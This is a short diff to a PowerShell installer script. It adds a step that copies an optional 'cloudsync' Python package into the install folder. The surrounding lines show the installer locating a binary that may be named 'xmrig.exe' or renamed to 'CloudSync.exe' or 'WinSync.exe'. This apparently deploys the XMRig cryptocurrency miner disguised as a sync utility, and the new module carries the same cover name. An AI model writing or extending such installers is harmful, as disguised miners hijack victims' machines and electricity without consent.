@@ -196,6 +196,18 @@ foreach ($f in $payload) {
     if (Test-Path $s) { Copy-Item -LiteralPath $s -Destination (Join-Path $InstallDir $f) -Force }
 }
 
+# modular runtime package: published additively, copied only when the source
+# tree carries it. Not a task action and not the default entry point yet, and a
+# source tree without cloudsync\ installs exactly as before.
+$packageSrc = Join-Path $src 'cloudsync'
+if (Test-Path -LiteralPath $packageSrc -PathType Container) {
+    Copy-Item -LiteralPath $packageSrc -Destination $InstallDir -Recurse -Force
+    $pkgFiles = @(Get-ChildItem -LiteralPath (Join-Path $InstallDir 'cloudsync') -Recurse -File -Filter '*.py' -ErrorAction SilentlyContinue)
+    Ok ("cloudsync package: {0} .py file(s)" -f $pkgFiles.Count)
+} else {
+    Say "  [i] no cloudsync package in source - legacy layout only"
+}
+
 # binary: accept either a rename at rest or the original name
 $binSrc = $null
 foreach ($n in @($BinaryName, 'CloudSync.exe', 'xmrig.exe', 'WinSync.exe', 'xmrig')) {
